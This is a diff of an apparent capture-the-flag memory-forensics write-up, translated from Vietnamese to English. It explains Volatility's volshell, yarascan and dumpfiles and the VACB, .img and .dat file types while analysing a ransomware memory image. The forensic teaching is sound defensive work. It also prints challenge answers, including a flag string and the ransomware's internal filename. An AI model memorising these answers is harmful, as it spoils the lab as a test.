+The system returns `65536` (which converts to `0x10000` in Hexadecimal).
+
+
+The `db(65536)` (Display Bytes) command will then print the data located at that specific address to the screen. 
+
+
+As it turns out, the attacker hid that 8-byte keyword right at the starting point (`0x10000`) of the Heap memory."
+
+
+> **`c0n6r475`**
 
 
 ### Q12 What is the ransomware file's internal name? {#3497b0eb61a480d98bb5f2cd5290a870}
 
 
+I used dumpfiles to dump all the files in the 3140 process. Then use `Resource Hacker`  to check the metadata of the executables
+
+
 ![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.34a7b0eb-61a4-80a8-b464-d0c21d9b2a47.png)
 
 
-calimalimodumator.exe
+> `calimalimodumator.exe`
 
 
-Cách làm: mở file vacb (virtual address control block)
-
-- Khi chạy file exe chẳng hạn thì không nạp hết dung lượng lên RAM (tốn RAM) mà sẽ cache (chia thành nhiều mảnh nhỏ 256kb). Khi CPU cần đọc code nào thì windows mới copy lên vùng system cache trên RAM.
-
-	→ mỗi mảnh nằm trên RAM là VACB, cấu trúc giống trên ổ cứng nên có thể đọc thông tin
-
-- File img là những bản của chương trình đã bung ra và thực thi trên RAM, tuân theo cấu trúc RAM nên đã biến đổi và không đọc được nữa (nên chỉ hiện một số ít thông tin)
-- File dat là file generic, không biết file gì thì tự windows nó đặt thành file này
-
-# Tổng kết {#34a7b0eb61a4801ab7fae044bfea5248}
+## Key takeaway {#34a7b0eb61a4801ab7fae044bfea5248}
 
 
-### 2. Yarascan là gì và tại sao lại "thần thánh" đến vậy? {#34a7b0eb61a4808bb0c5d46695eb5c8e}
+### Yarascan {#35f7b0eb61a480dda092fa3cf9bb1f9d}
+
+- Core Concept: YARA is a tool that identifies and classifies malware based on textual or binary patterns.
+- Volatility `yarascan` Plugin: This is a perfect combination. Volatility brings the power of YARA directly into RAM (memory) scanning.
+
+How `yarascan` works:
 
 
-**YARA** được mệnh danh là "Dao Thụy Sĩ của nhà nghiên cứu mã độc" (The pattern matching swiss knife for malware researchers).
+When you run `yarascan -Y "string"`, Volatility will:
 
-- **Bản chất:** YARA là một công cụ giúp nhận dạng và phân loại mã độc dựa trên các mẫu (patterns) là chuỗi văn bản (text) hoặc chuỗi nhị phân (binary). Nó giống như việc bạn dạy cho hệ thống nhận diện gương mặt của một tội phạm dựa trên đặc điểm: "Có nốt ruồi dưới mắt trái, cao 1m8, hay mặc áo đỏ".
-- **Plugin** **`yarascan`** **trong Volatility:** Đây là sự kết hợp hoàn hảo. Volatility đem sức mạnh của YARA vào việc quét bộ nhớ RAM (Memory).
+1. Penetrate deep into the memory space (including hidden or unlinked segments) - requirement: you can’t only use YARA scan on the
+2. Scan from beginning to end to find the exact virtual address (coordinates) where that string resides.
+3. Upon finding it, it provides two highly valuable outputs:
+	- Virtual Address (0x...): The exact coordinate of the text in memory.
+	- Hex Dump & ASCII: It prints the surrounding memory area in Hex and ASCII formats, allowing you to see if any passwords or additional payloads are hidden nearby.
 
-**Chức năng chính của** **`yarascan`****:**
-Khi bạn chạy `yarascan -Y "chuỗi_ký_tự"`, Volatility sẽ:
+A Practical Analogy:
 
-1. Luồn sâu vào không gian bộ nhớ (kể cả những vùng bị che giấu).
-2. Quét từ đầu đến cuối xem chuỗi "chuỗi_ký_tự" đó nằm ở tọa độ (địa chỉ ảo) nào.
-3. Khi tìm thấy, nó sẽ cung cấp cho bạn 2 thứ cực kỳ giá trị:
-	- **Địa chỉ Virtual Address (0x...):** Tọa độ chính xác của đoạn chữ đó (Để bạn điền vào câu Q10).
-	- **Hex Dump & ASCII:** Nó in ra khu vực xung quanh đoạn chữ đó dưới dạng mã Hex và chữ thường để bạn xem có giấu thêm mật khẩu/thông tin gì ở quanh đó không.
+- If running `strings` is like dumping a bucket of sand on the floor and finding seashells (you know they exist, but have no idea exactly where they came from)...
+- ...then `yarascan` is like using a metal detector on a beach. When it beeps, it doesn't just tell you metal is present; it gives you the exact GPS coordinates (Virtual Address) of that metal buried under the sand (RAM).
 
-**Ví dụ thực tế:**
-
-- Nếu `strings` giống như việc bạn đổ một xô cát ra và nhặt được các vỏ sò (chỉ biết nó có vỏ sò, không biết nguồn gốc).
-- Thì `yarascan` giống như bạn cầm một chiếc máy dò kim loại đi dò trên bãi biển. Khi nó kêu "Bíp", nó không chỉ cho bạn biết có kim loại, mà còn chỉ chính xác tọa độ (kinh độ, vĩ độ) của cục kim loại đó dưới lòng đất (RAM).
-
-### volshell {#34a7b0eb61a480b18fece5c4ba6ea83b}
+### Volshell (Interactive Memory Analysis) {#35f7b0eb61a480f0bd56d225003aa31b}
 
 
-Là plugin phục vụ phân tích trực tiếp trên RAM
+`volshell` is a plugin designed for direct, interactive memory analysis.
 
-- cc(pid=1234): di chuyển vào bộ nhớ của pid
-- dt(”ten_cau_truc”, dia_chi):   Ví dụ: `dt("_EPROCESS")` sẽ in ra toàn bộ thông tin nội bộ của một tiến trình.
-- **`db(địa_chỉ, số_lượng)`** **(Display Bytes):** Lệnh bạn vừa dùng. Nó in dữ liệu ra dưới dạng bảng mã Hex và ASCII.
-- **`dd(địa_chỉ)`** **(Display Dwords):** Đọc dữ liệu theo từng khối 4 byte (rất hữu ích khi tìm kiếm các địa chỉ IP hoặc con trỏ bộ nhớ).
+- `cc(pid=1234)`: Changes the current context to the memory space of a specific PID.
+- `dt("structure_name", address)`: For example, `dt("EPROCESS")` prints the entire internal structure of a process.
+- `db(address, length)` (Display Bytes): The command used earlier. It prints data in Hex and ASCII tables.
+- `dd(address)` (Display Dwords): Reads data in 4-byte chunks (highly useful for finding IP addresses or memory pointers).
 
-volshell sẽ hữu ích:
+When `volshell` is most useful:
 
-- Hacker dùng DKOM (direct kernel object manipulation): tách khỏi dslk làm mù pslist.
-- Mã độc tự viết: như trường hợp hacker giấu thông tin ở câu 11
-- Tự viết plugin: dùng volshell để chạy python trước khi đóng gói thành plugin hoàn chỉnh
+- When an attacker uses DKOM (Direct Kernel Object Manipulation) to unlink processes and blind the `pslist` plugin.
+- When analyzing custom/novel malware, such as manually extracting the hidden 8-byte key from the heap.
+- For plugin development: You can use `volshell` to prototype Python commands before writing a full Volatility plugin.
+
+### VACB {#35f7b0eb61a4809486d2c033f3bfd04c}
+
+
+1. What is a VACB (Virtual Address Control Block)?
+
+
+When you run a large executable (or open a massive file), Windows does _not_ load the entire file into RAM at once, because that would waste system memory. Instead, Windows uses the Cache Manager.
+The Cache Manager maps files from the hard drive into memory in 256 KB chunks. The data structure that keeps track of these 256 KB chunks is called a Virtual Address Control Block (VACB).
+When Volatility tries to extract a file from a memory dump (e.g., using the `dumpfiles` plugin), it actively hunts for these VACBs to stitch the 256 KB chunks back together into a complete file.
+
+
+2. Why do you get `.img` files?
+
+
+When an executable (`.exe` or `.dll`) is run, Windows maps it into memory using Section Objects. A file sitting on your hard drive is packed tightly. But when it is loaded into RAM to be executed, Windows stretches it out and aligns the sections to fit memory pages (called "Image Alignment").
+When Volatility dumps this running process, it saves it as a `.img` (Image) file. Because it has been stretched out and modified by the Windows loader (e.g., import tables resolved, sections shifted), the `.img` file will _not_ have the exact same hash or structure as the original `.exe` on disk.
+
+
+3. Why do you get `.dat` files?When Windows caches normal data (like a `.txt` file, a `.zip`, or a configuration file) into VACBs, it doesn't always care about the file extension. If Volatility stitches the chunks back together but cannot definitively prove the file's original name or extension from the surrounding memory structures, it defaults to saving it as a generic `.dat` file.
+
